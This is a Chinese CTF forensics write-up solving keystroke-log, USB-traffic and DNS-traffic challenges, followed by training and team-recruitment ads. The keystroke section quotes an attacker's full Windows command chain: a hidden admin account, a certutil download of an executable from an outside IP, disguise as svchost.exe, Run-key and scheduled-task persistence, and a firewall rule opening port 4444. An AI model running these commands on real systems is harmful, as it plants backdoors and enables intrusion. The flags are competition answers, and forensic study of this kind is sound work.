![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/f3019f5006fe2d1b.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/f9b4db8bdf9a8714.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/33bded1b745cdeee.png)

* * *

键盘取证-爱而不得：

此题重要点为介绍的

\*\*王若杳\*\*，网名"杳杳"

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/63a0675cda0feab4.png)

将重要内容粘贴出来进行分析

```powershell
wangruoyaoWr040February!baobao you yige nande xiangyao zhui wo ,hao fan a !gen ge bain<del><del><del>iantai shide ,yizhi jiejin wohaoxiang shi jiao liuluni bang wo xiangxiang zenme banwo xian shui la !baobao wanan <GA>baobao[Win] Rrcmdwhami<del><del><del><del>hoamiipconfignet usernet user happy$ woaini yaoyao @20030613 /addnet localgroup administrators happy$ /addcertutil -urlcache -split -f http"//124.223.18.231/gift.exe :C"\Users\wangruoyao\Desktop\songgei yaoyao de liwu -zhiyou yaoyao cai keyi dakai .exe:copy :C"\Users\wangruoyao\Desktop\songgei *: C"\Windows\Temp\svchost.exeattrib +h +s C"\Windows\Temp\svchost.exereg add :HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run: /v :SystemUpdate: /t REG_SZ /d :C"\Windows\Temp\svchost.exe: /fschtasks /create /tn :WindowsUpdate: /tr :C"\Windows\Temp\svchost.exe: /sc onlogon /ru Systemcopy C"\Windows\Temp\svchost.exe :C"\Users\wangruoyao\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe:netsh advfirewall firewall add rule name=:allow_remote: dir=in action=allow protocol=tcp localport=4444dir C"\Users\wangruoyao\Desktoptype C"\Users\wangruoyao\Desktop\notes.txtnetstat -anotasklistexit
```

1.受害者计算机的登录用户名是什么？

flag{ wangruoyao }

通过介绍和用软件分析出来的内容可知为 wangruoyao

2.受害者的登录密码是什么？

flag{Wr040February!}

登录用户名下面就是密码

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/df67dfcf19b89490.png)

3.攻击者"happy"的真实姓名是什么？（提交拼音小写）

flag{liulu}

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/781e0b5d676cefaf.png)

有个男的想追我,注意最后这句，好像是 liulu

4攻击者在受害者计算机上创建的隐藏账户及其密码分别是什么？（密码为中文，需根据拼音还原）

flag{happy$/我爱你杳杳@20030613}

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/4a7b350f48b9f379.png)

这边 $暴露了隐藏账户，将我爱你后面 杳杳 为背景介绍的名字

5.攻击者入侵后执行的第一条系统命令是什么？

flag{whoami}

‘whami删除了四个就是w

后面接上了hoami，就是whoami

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/df2b4c663f55f0d8.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/0c307f2dc4fa6023.png)

6.攻击者入侵后执行的最后一条命令是什么？

flag{exit}

看最后一段即可， exit

7.攻击者使用了什么系统自带工具从远程服务器下载恶意程序？

flag{certutil}

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/670b323cee9772a6.png)

这段暴露出来了问题 7和8还有9

8.攻击者下载恶意程序所连接的远程服务器 IP地址是什么？

flag{124.223.18.231}

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/c878733fea20b34e.png)

9.攻击者下载到受害者桌面的恶意文件完整文件名是什么？（需根据拼音还原中文）

flag{送给杳杳的礼物-只有杳杳才可以打开.exe}

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/8b982705b5a8e8fe.png)

10.攻击者写入注册表实现开机自启动的键值名称是什么？

flag{SystemUpdate}

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/a3c423336d103e94.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/7986d7bb4e2a46ae.png)

这块暴露了

11.攻击者通过防火墙规则开放了哪个本地端口的入站访问？

flag{4444}

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/f7ef5cad9aae7dcb.png)

找关键点 port即可找到

获得 flag{0c6ae9233f9e45388bcaf3cba798f7e5}

* * *

USB流量分析：

通过镜像翻转图片

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/be7cabd9d0ee5366.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/8b218461df6a4700.png)

FLAG{508E95350D8A42C382F9560218D07B5D}

将 flag换成全小写

flag{508e95350d8a42c382f9560218d07b5d}

* * *

DNS流量分析：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/6c89271a80529ef1.png)

获得密钥通过 base64解密

hbc2@kfcfwa2026!

```javascript
85e99f1b7c61dd5fda41a0860c6169bbbd08a975aaed0b0c3a20563a4f45b571ac53c35940cd6204099463929dd66dd3
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/4324a3c30699977f.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/2aa25ac298bf7e35.png)

密文提取-通用 aes-ecb脚本解密：

```python
from base64 import b64decodefrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadkey = "aGJjMkBrZmNmd2EyMDI2IQ=="key = b64decode(key)cipher_hex = ("85e99f1b7c61dd5f""da41a0860c6169bb""bd08a975aaed0b0c""3a20563a4f45b571""ac53c35940cd6204""099463929dd66dd3")ciphertext = bytes.fromhex(cipher_hex)cipher = AES.new(key, AES.MODE_ECB)plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)print(plaintext.decode())
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/187a35789d7e20b1.png)

flag{18A55236EC494BA53238DA9613BB9AAE}

* * *

欢迎师傅加入交流群学习/招新简历可以联系小编！

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/9d2679e114437ad9.jpg)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/0f5a9b85db074143.jpg)

* * *

排版偏手机观看，手机看效果体验更好哦！

需要交流或者培训可以联系小编加群交流！

2025第二届全国行业赛-电子取证师需要资源dd

初赛培训班10+学员全部晋级复赛，可以指导！

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/61a7bcc75c10a71a.webp)

此次2025行业赛圆满结束！

需要备战2027第三届网络安全行业赛-电子取证赛道的可以联系小编.适合取证感兴趣的小伙伴，0基础也能学。

PS：第二届甘肃技能大赛通知-真题辅导需要可以联系！

* * *

数据安全/信息安全评估赛项星球

第二届数字化职工组/数据安全技能大赛（备战第三届可以培训）

第四届全国数据安全职业技能竞赛（美亚数据安全管理员/可培训）

知识星球699/年（后续有最新资源可能涨价，购买前私信小编！）

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/5ecd1fc0b33c0a5c.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/13542221b4747e93.webp)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/cb182d8e4de6abd8.webp)

****关注我们/战队招新****

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/8f79e578003edd34.webp)

招新要求：

热爱安全，不止围观。

为了聚集更多热爱网络安全与 CTF 的伙伴，鱼影安全现面向全网招募战队成员。无论你是在校学生、安全从业者，还是正在自学的新人，只要愿意持续投入、认真钻研，都欢迎加入我们。

### 招募方向：

Web安全/Pwn/Reverse/Crypto/Misc/Ai安全及相关方向

### 我们希望你：

1.对网络安全和 CTF 有长期兴趣，能够保持稳定学习，而不是三分钟热度；

2.至少掌握一项基础能力，例如 Linux、Python、Web 基础、逆向分析或密码学基础；

3.能够独立完成简单题目，并清晰整理、复现解题过程；

4.有责任心和团队意识，比赛期间能够及时沟通、合理配合；

5.遵守法律法规和团队纪律，技术仅用于合法授权的学习、研究与竞赛。

没有比赛经验也可以报名。相比“现在有多强”，我们更看重你的学习能力、执行力和持续投入。

### 加入后你可以获得：

1.日常刷题、技术交流与经验分享；

2.CTF 赛事组队及实战机会(线下组局认识大佬机会）

3.优质题目、工具和学习资料共享；（内部比赛环境资源）

4.Writeup、原创文章及个人成果展示机会；

5.与团队成员共同研究、共同进步的技术氛围。

我们不要求你一开始就很强，但希望你靠谱、主动、愿意坚持。

如果你也想从“看别人做题”走向“自己拿下 Flag”

欢迎加入鱼影安全 CTF 战队

联系方式：添加上面小编绿泡泡发简历即可

欢迎关注 **鱼影安全** 社区,专注CTF,职业技能大赛中高职技能培训,信息安全评估高职组赛项,金砖一带一路诸暨技能大赛:企业信息安全赛道-攻防治理赛道-首届金砖虚拟网络建设赛道-创信大赛,世界技能大赛省选拔赛,企业赛,行业赛,电子取证和CTF系列培训,工控CTF系列，第二届网络安全行业职业技能大赛（电子取证师、渗透测试员、网络安全管理员、网络信息审核员）等。

鱼影安全团队招人啦,有感兴趣的师傅可以私信我

电子取证培训、盘古石、美亚杯、内部比武可以一对一指导！

需要学习数据安全管理员和CTF安全培训,可以联系小编！

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/ed114c9d78bdbf8d.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/849bf68f70a42413.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/9236b4b18fa0d732.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/7bc7aa814bb33e63.gif)

**点分享**

**点收藏**

**点在看**

**点点赞**
